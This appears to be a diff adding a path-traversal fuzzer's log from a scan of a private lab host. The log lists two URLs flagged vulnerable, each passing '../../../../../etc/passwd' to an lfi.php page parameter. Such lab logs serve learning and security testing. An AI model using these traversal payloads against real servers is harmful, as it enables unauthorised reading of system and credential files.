@@ -1,0 +1,18 @@
+
+[+] Date and Time: 06-27-2022 11:14:20
+
+[========== TARGET INFORMATION ==========]
+[+] Hostname: 10.10.47.155
+[+] Protocol: http
+[+] Port: 80
+
+[=========== TRAVERSAL ENGINE ===========]
+[+] Traversal Engine DONE ! - Total traversal tests created: 11028
+
+[+] Total Traversals found: 2
+[-] Fuzz testing aborted
+[+] Replacing "TRAVERSAL" with the traversals created and sending
+
+[*] Testing URL: http://10.10.47.155/lfi2/lfi.php?page=../../../../../etc/passwd <- VULNERABLE
+
+[*] Testing URL: http://10.10.47.155/lfi2/lfi.php?page=../../../../../../etc/passwd <- VULNERABLE
